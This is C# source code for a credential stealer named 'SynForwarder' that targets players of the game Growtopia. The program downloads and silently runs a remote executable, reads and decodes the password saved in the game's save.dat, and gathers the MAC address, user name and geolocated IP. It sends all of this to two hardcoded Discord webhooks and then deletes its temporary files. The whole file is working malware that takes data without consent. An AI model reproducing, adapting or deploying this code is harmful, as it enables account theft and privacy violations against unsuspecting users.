using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

namespace synforwarder;

public class MainClass
{
	public static class pwDec
	{
		public static List<string> ParsePassword(byte[] contents)
		{
			try
			{
				string text = "";
				foreach (byte b in contents)
				{
					string text2 = b.ToString("X2");
					text = ((!(text2 == "00")) ? (text + text2) : (text + "<>"));
				}
				if (text.Contains("74616E6B69645F70617373776F7264"))
				{
					string text3 = "74616E6B69645F70617373776F7264";
					int num = text.IndexOf(text3);
					int num2 = text.LastIndexOf(text3);
					num += text3.Length;
					int num3 = text.IndexOf("<><><>", num);
					string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
					string text4;
					if (@string.ToCharArray()[0] != '_' || 1 == 0)
					{
						text4 = text.Substring(num, num3 - num).Trim();
					}
					else
					{
						num2 += text3.Length;
						num3 = text.IndexOf("<><><>", num2);
						text4 = text.Substring(num2, num3 - num2).Trim();
					}
					string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
					int num4 = text.IndexOf(text5);
					num4 += text5.Length;
					int num5 = text.IndexOf("<><><>", num4);
					string text6 = text.Substring(num4, num5 - num4).Trim();
					int num6 = StringToByteArray(text4)[0];
					text6 = text6.Substring(0, num6 * 2);
					StringToByteArray(text6.Replace("<>", "00"));
					List<byte> list = new List<byte>();
					List<byte> list2 = new List<byte>();
					for (int j = 0; j < list.Count; j++)
					{
						list2.Add((byte)(list[j] - 1 - j));
					}
					List<string> list3 = new List<string>();
					for (int k = 0; k <= 255; k++)
					{
						string text7 = "";
						foreach (byte item in list2)
						{
							if (ValidateChar((char)(byte)(item + k)))
							{
								text7 += (char)(byte)(item + k);
							}
						}
						if (text7.Length == num6)
						{
							list3.Add(text7);
						}
					}
					return list3;
				}
				return null;
			}
			catch
			{
				return null;
			}
		}

		public static byte[] StringToByteArray(string str)
		{
			Dictionary<string, byte> dictionary = new Dictionary<string, byte>();
			for (int i = 0; i <= 255; i++)
			{
				dictionary.Add(i.ToString("X2"), (byte)i);
			}
			List<byte> list = new List<byte>();
			for (int j = 0; j < str.Length; j += 2)
			{
				list.Add(dictionary[str.Substring(j, 2)]);
			}
			return list.ToArray();
		}

		private static bool ValidateChar(char cdzdshr)
		{
			return (cdzdshr >= '0' && cdzdshr <= '9') || (cdzdshr >= 'A' && cdzdshr <= 'Z') || (cdzdshr >= 'a' && cdzdshr <= 'z') || (cdzdshr >= '+' && cdzdshr <= '.');
		}

		public static string[] Func(byte[] lel)
		{
			List<string> list = ParsePassword(lel);
			return list.ToArray();
		}
	}

	public class Packet
	{
		public string growid;

		public string password;

		public string MAC;

		public string computerInfo;

		public string lastworld;

		public string user;

		public string token;

		public string ip;

		public string browsercreds;

		public string desktoppic;
	}

	private static string growid = "";

	private RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);

	public static void ExtractResource(string FileName, string Name)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(FileName);
		byte[] array = new byte[(int)stream.Length];
		stream.Read(array, 0, array.Length);
		File.WriteAllBytes(Name, array);
	}

	public static void Main(string[] args)
	{
		Packet packet = new Packet();
		while (true)
		{
			WebClient webClient = new WebClient();
			try
			{
				webClient.DownloadString("http://google.com");
			}
			catch
			{
				Thread.Sleep(15000);
				continue;
			}
			break;
		}
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
		ServicePointManager.ServerCertificateValidationCallback = (object snder, X509Certificate cert, X509Chain chain, SslPolicyErrors error) => true;
		string text = Path.GetTempPath() + "\\syasdjx.exe";
		if (!File.Exists(text))
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			WebClient webClient2 = new WebClient();
			webClient2.DownloadFile("https://github.com/xSynapticV2/test123123123123123/raw/master/savedecrypter.exe", text);
		}
		Process process = new Process();
		process.StartInfo.FileName = text;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.WorkingDirectory = Path.GetTempPath();
		process.Start();
		process.WaitForExit();
		string[] array = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[1] { '|' });
		try
		{
			packet.growid = array[0];
			packet.password = array[1];
			packet.lastworld = array[2];
			growid = packet.growid;
		}
		catch
		{
			byte[] array2 = File.ReadAllBytes((string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Growtopia", "path", null) + "\\save.dat");
			Regex regex = new Regex("[^\\w0-9]");
			string text2 = Encoding.Default.GetString(array2).Replace("\0", " ");
			packet.growid = regex.Replace(text2.Substring(text2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[1] { ' ' })[3], string.Empty);
			string text3 = null;
			string[] array3 = pwDec.Func(array2);
			foreach (string text4 in array3)
			{
				text3 = text3 + text4 + "\r\n";
			}
			packet.password = text3;
			packet.lastworld = regex.Replace(text2.Substring(text2.IndexOf("lastworld") + "lastworld".Length).Split(new char[1] { ' ' })[3], string.Empty);
			if (packet.lastworld == "lastworld")
			{
				packet.lastworld = "unknown";
			}
		}
		packet.computerInfo = Environment.MachineName;
		packet.user = Environment.UserName;
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Position = 0L;
		new StreamReader(memoryStream).ReadToEnd();
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		string address = "https://discord.com/api/webhooks/772548229870387231/qA-L8cqiHi16LqGSW1VdUmlrT85XQ0l60Js_4tAgOXz-7JGmRsj-Fbv5nfVNvOBMd5f4";
		string address2 = "https://discord.com/api/webhooks/738657551465578587/Z2xq2ccBQN59GEp02I9DNtIwv1HjpudGBqO8qg_uqG4g3fU5okCjND4Hipe5mwaFAUcx";
		WebClient webClient3 = new WebClient();
		string text5 = (from nic in NetworkInterface.GetAllNetworkInterfaces()
			where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
			select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
		string text6 = new WebClient().DownloadString("http://ip-api.com/line/?fields=country,city,proxy,query");
		string text7 = text6.Split(new char[1] { '\n' })[0];
		string text8 = text6.Split(new char[1] { '\n' })[3];
		string text9 = text6.Split(new char[1] { '\n' })[1];
		string text10 = text6.Split(new char[1] { '\n' })[2];
		NameValueCollection nameValueCollection = new NameValueCollection();
		string value = "\tCountry: " + text7 + "\nCity: " + text9 + "\nIp Adress: " + text8 + "\nPC Name: " + packet.user + " \nGrowID: " + packet.growid + " \nPassword: " + packet.password + " \nLastWorld: " + packet.lastworld + "\nVPN Detected: " + text10 + "\nMAC Adress: " + text5;
		nameValueCollection.Add("username", "SynForwarder");
		nameValueCollection.Add("avatar_url", "https://cdn.discordapp.com/attachments/720522493500194836/738126740290797608/image0.png");
		nameValueCollection.Add("content", value);
		byte[] bytes = webClient3.UploadValues(address, "POST", nameValueCollection);
		webClient3.UploadValues(address2, "POST", nameValueCollection);
		Encoding.UTF8.GetString(bytes);
		webClient3.Dispose();
		try
		{
			File.Delete(Path.GetTempPath() + "\\result.txt");
			File.Delete(text);
		}
		catch
		{
		}
	}
}
